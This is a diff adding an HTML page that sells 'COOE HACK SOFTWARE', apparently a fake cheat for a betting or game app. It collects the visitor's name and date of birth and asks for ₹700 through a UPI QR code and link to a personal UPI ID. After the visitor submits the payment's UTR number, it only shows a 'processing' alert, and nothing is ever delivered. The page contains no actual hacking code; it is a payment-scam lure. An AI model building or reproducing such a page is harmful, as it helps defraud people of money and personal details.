@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>COOE HACK SOFTWARE | Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Orbitron', sans-serif; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .container { max-width: 450px; margin: auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 15px; box-shadow: 0 0 20px #00ff00; }
+        h2 { text-align: center; text-transform: uppercase; color: #fff; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #00ff00; color: #fff; border-radius: 5px; box-sizing: border-box; }
+        .price-tag { text-align: center; font-size: 20px; color: #ff00ff; margin: 15px 0; }
+        .pay-btn { width: 100%; padding: 15px; background: #00ff00; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        #upi-section { display: none; text-align: center; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>COOE HACK SOFTWARE</h2>
+    <input type="text" placeholder="Full Name" id="name">
+    <input type="date" id="dob">
+    <select id="hack-type">
+        <option value="Premium">Premium Hack</option>
+        <option value="Advance">Advance Hack</option>
+        <option value="Level3">Under 3 Level</option>
+        <option value="Level4">Under 4 Level</option>
+    </select>
+    
+    <div class="price-tag">Price: ₹700</div>
+    <button class="pay-btn" onclick="showPayment()">GET YOUR HACK</button>
+
+    <div id="upi-section">
+        <p>Scan & Pay ₹700</p>
+        <!-- UPI QR Code Generator API -->
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=shivchawa@axl&pn=COOE_HACK&am=700&cu=INR" alt="QR">
+        <p>UPI: <b>shivchawa@axl</b></p>
+        <a href="upi://pay?pa=shivchawa@axl&pn=COOE_HACK&am=700&cu=INR" class="pay-btn">Pay via GPay/PhonePe</a>
+        <input type="text" placeholder="Enter UTR Number" id="utr">
+        <button class="pay-btn" onclick="confirmPayment()">SUBMIT UTR</button>
+    </div>
+</div>
+
+<script>
+    function showPayment() { document.getElementById('upi-section').style.display = 'block'; }
+    function confirmPayment() {
+        alert("Wait for confirmation! Your request is processing...");
+    }
+</script>
+</body>
+</html>
+
